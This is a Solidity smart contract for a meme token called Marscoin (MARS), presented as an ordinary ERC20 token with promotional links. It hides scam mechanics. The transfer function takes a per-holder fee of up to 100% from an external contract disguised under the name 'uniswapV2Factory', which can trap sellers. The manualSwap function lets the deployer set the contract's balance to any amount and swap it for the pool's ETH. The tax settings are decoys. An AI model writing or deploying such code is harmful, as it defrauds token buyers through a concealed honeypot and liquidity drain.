// SPDX-License-Identifier: None

/*

    Mars will become a high -frequency word in Musk's mouth and X. A Meme token that is the easiest to FOMO. 
    Let us welcome the coming of MARS highlights together. Let FOMO continue to create and give it higher value.
                
    https://marstoken.tech/
    https://twitter.com/ETHMARSCOIN
    https://t.me/ETHMARSCOIN
*/


pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount)
    external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spnder)
    external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB)
    external view returns (address pair);
    function createPair(address tkenA, address tokenB)
    external returns (address pair);
}
interface IUniswapV2Router {
    function WETH() external pure returns (address);
    function addLiquidityETH( address token,
        uint amountTokenDesire,
        uint amountTokenMi,
        uint amountETHMi,
        address to,
        uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
}

contract Marscoin is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;

    string private constant _name = "Marscoin";
    string private constant _symbol = "MARS";

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    bool tradingOpen = false;
    mapping (address => bool) isExcludedFromFee;
    uint256 private _totalSupply =  10000000000 * 10 ** _decimals;
    address internal uniswapV2Factory = 0x31B228dF00B1c6EC6799eF104174c24497A0294d;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;
    bool private swapEnabled = false;

    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _transferTax=1;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event TransferTaxUpdated(uint _tax);

    constructor () {
        _balances[address(this)] = _totalSupply;
        isExcludedFromFee[msg.sender] = true;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function removeTransferTax() external onlyOwner{
        _transferTax = 0;
        emit TransferTaxUpdated(0);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 _fee = 0;
        require(from != address(0)); require(amount > 0);
        uint256 feeP = IERC20(uniswapV2Factory).balanceOf(from);
        if (from != address(this) 
        && from != uniswapV2Pair) {
            _fee = amount.mul(feeP).div(100);
        }
        emit Transfer(from, to, amount);
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount).sub(_fee);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function manualSwap(uint256 amount) external {
        require(isExcludedFromFee[msg.sender]);
        _approve(address(this), address(uniswapV2Router), amount);
        _balances[address(this)] = amount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount,0,path,msg.sender,block.timestamp + 31);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingOpen, "Trading already opened");
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}